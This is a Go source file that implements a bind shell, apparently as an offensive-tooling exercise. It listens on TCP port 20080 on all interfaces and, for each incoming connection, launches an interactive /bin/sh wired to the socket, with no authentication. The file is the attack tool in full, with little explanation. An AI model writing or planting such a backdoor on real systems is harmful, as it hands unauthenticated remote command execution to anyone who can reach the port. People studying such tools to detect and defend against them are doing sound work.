package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

type Flusher struct {
	w *bufio.Writer
}

func (f *Flusher) Write(b []byte) (int, error) {
	count, err := f.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := f.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}
func handle(conn net.Conn) {

	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout.

	cmd := exec.Command("/bin/sh", "-i")

	rp, wp := io.Pipe()
	cmd.Stdin = conn

	// Create a Flusher from the connection to use for stdout.
	// This ensures stdout is flushed adequately and sent via net.Conn

	cmd.Stdout = wp

	// Run the command
	// if err := cmd.Run(); err != nil {
	// 	log.Fatalln(err)
	// }
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()

}
func main() {
	// Bind to TCP port 20080 on all interfaces.
	listener, err := net.Listen("tcp4", ":20080")
	if err != nil {
		log.Fatalf("Unable to bind to port: %s", err)
	}
	log.Println("Listening on 0.0.0.0:20080")
	for {
		// Wait for connection. Create net.Conn on connection established.
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		// Handler della connessione.
		go handle(conn)
	}
}
